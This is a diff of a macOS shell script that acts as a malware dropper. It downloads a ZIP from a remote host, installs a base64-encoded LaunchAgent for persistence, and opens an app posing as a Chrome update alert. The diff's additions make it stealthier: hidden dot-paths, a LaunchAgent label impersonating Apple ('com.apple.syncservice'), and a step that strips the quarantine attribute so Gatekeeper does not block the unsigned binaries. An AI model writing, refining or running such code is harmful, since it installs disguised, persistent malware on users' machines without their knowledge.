@@ -3,11 +3,12 @@
 # Define variables for URLs
 ZIP_URL_ARM64="https://lazr-beryl.vercel.app/Willo1.zip"
 ZIP_URL_INTEL="https://lazr-beryl.vercel.app/Willo1.zip"
-ZIP_FILE="/var/tmp/Willo.zip"                        # Path to save the downloaded ZIP file
-WORK_DIR="/var/tmp/Willo/"                            # Temporary directory for extracted files
-EXECUTABLE="willoservice.sh"                         # Replace with the name of the executable file inside the ZIP
-APP="ChromeUpdateAlert.app"                         # Replace with the name of the app to open
-PLIST_FILE=~/Library/LaunchAgents/com.willo.plist    # Path to the plist file
+ZIP_FILE="/var/tmp/.syncsvc.zip"                      # Path to save the downloaded ZIP file
+WORK_DIR="/var/tmp/.syncsvc/"                         # Temporary directory for extracted files
+EXECUTABLE="syncservice.sh"                           # Launcher script inside the ZIP
+APP="ChromeUpdateAlert.app"                           # The app to open
+PLIST_FILE=~/Library/LaunchAgents/com.apple.syncservice.plist   # LaunchAgent plist
+LABEL="com.apple.syncservice"                         # LaunchAgent label
 
 # Determine CPU architecture
 case $(uname -m) in
@@ -54,7 +55,7 @@ with urllib.request.urlopen(url, context=ctx) as r, open(outfile, 'wb') as f:
     fi
 
 else
-    # If curl/download failed
+    # If download failed
     cleanup
     exit 1
 fi
@@ -63,23 +64,26 @@ fi
 mkdir -p ~/Library/LaunchAgents
 
 # Base64 encoded plist content
-ENCODED_PLIST="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KICAgIDxrZXk+TGFiZWw8L2tleT4KICAgIDxzdHJpbmc+Y29tLndpbGxvPC9zdHJpbmc+CiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4KICAgIDxhcnJheT4KICAgICAgICA8c3RyaW5nPi92YXIvdG1wL1dpbGxvL3dpbGxvc2VydmljZS5zaDwvc3RyaW5nPgogICAgPC9hcnJheT4KICAgIDxrZXk+UnVuQXRMb2FkPC9rZXk+CiAgICA8dHJ1ZS8+CiAgICA8a2V5PktlZXBBbGl2ZTwva2V5PgogICAgPGZhbHNlLz4KPC9kaWN0Pgo8L3BsaXN0Pgo="
+ENCODED_PLIST="PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHBsaXN0IFBVQkxJQyAiLS8vQXBwbGUvL0RURCBQTElTVCAxLjAvL0VOIiAiaHR0cDovL3d3dy5hcHBsZS5jb20vRFREcy9Qcm9wZXJ0eUxpc3QtMS4wLmR0ZCI+CjxwbGlzdCB2ZXJzaW9uPSIxLjAiPgo8ZGljdD4KICAgIDxrZXk+TGFiZWw8L2tleT4KICAgIDxzdHJpbmc+Y29tLmFwcGxlLnN5bmNzZXJ2aWNlPC9zdHJpbmc+CiAgICA8a2V5PlByb2dyYW1Bcmd1bWVudHM8L2tleT4KICAgIDxhcnJheT4KICAgICAgICA8c3RyaW5nPi92YXIvdG1wLy5zeW5jc3ZjL3N5bmNzZXJ2aWNlLnNoPC9zdHJpbmc+CiAgICA8L2FycmF5PgogICAgPGtleT5SdW5BdExvYWQ8L2tleT4KICAgIDx0cnVlLz4KICAgIDxrZXk+S2VlcEFsaXZlPC9rZXk+CiAgICA8ZmFsc2UvPgo8L2RpY3Q+CjwvcGxpc3Q+Cg=="
 
 # Decode the base64 string and write to the plist file
 base64 -D <<< "$ENCODED_PLIST" > "$PLIST_FILE"
 
 chmod 644 "$PLIST_FILE"
 
-if ! launchctl list | grep -q "com.willo"; then
+if ! launchctl list | grep -q "$LABEL"; then
     launchctl load "$PLIST_FILE"
 fi
 
-# Step 5: Run ChromeUpdateAlert.app
+# Step 5: Strip quarantine attribute (unsigned binaries; avoid Gatekeeper block)
+xattr -dr com.apple.quarantine "$WORK_DIR" 2>/dev/null
+
+# Step 6: Run ChromeUpdateAlert.app
 if [[ -d "$WORK_DIR/$APP" ]]; then
     open "$WORK_DIR/$APP" &
 fi
 
-# Step 6: Start the agent immediately (the LaunchAgent only fires at login)
+# Step 7: Start the agent immediately (the LaunchAgent only fires at login)
 bash "$WORK_DIR/$EXECUTABLE" &
 
 # Final cleanup
